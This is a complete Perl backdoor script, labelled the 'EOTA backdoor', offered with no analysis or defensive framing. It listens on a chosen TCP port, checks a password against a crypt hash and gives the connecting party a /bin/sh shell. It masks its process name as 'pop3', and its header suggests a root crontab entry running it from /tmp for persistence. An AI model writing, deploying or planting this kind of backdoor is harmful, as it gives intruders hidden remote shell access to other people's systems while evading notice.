#!/usr/bin/perl
###################################################
# EOTA (Eye_Of_The_Ass) BACKDOOR                  #
# scheduled backdoor                              #
#              									  #
# /etc/crontab                                    #
# 22 3 * * * root /tmp/eota.pl                    #
# usage: perl ./back.pl port_N°                   #
###################################################
use Socket;
use strict;
use warnings;
my $ent	= shift || die "perl $0 <port>\n";
my $sec	= 'sai3gAJK84MO2';    #perl -e 'print crypt ("PASSWORD","salto")'
my $acs	= '/bin/sh'; #SHELL
my $service   = 'pop3' . "\0" x16; #SERVICE
$0		= 'pop3' . "\0" x16; #SERVICE
my $pr	= getprotobyname('tcp');
socket(SERVER, PF_INET, SOCK_STREAM, $pr) || die "socket: $!";
bind(SERVER, sockaddr_in($ent, INADDR_ANY)) || die "bind: $!";
listen(SERVER, SOMAXCONN) || die "listen: $!";
while(accept(CLIENT, SERVER)) {
  my $conf= undef;
  open(STDIN, "<&CLIENT");open(STDOUT, ">&CLIENT");open(STDERR, ">&CLIENT");
  recv CLIENT, $conf, 15, 0; 
  chop($conf); 								
  if (crypt ($conf, $sec) eq $sec) {
	open(STDIN, ">&CLIENT");
	open(STDOUT, ">&CLIENT");
	open(STDERR, ">&CLIENT");
	system($acs);
	close(STDIN);
	close(STDOUT);
	close(STDERR);
  }
  close(STDIN);close(STDOUT);close(STDERR);close (CLIENT);
}
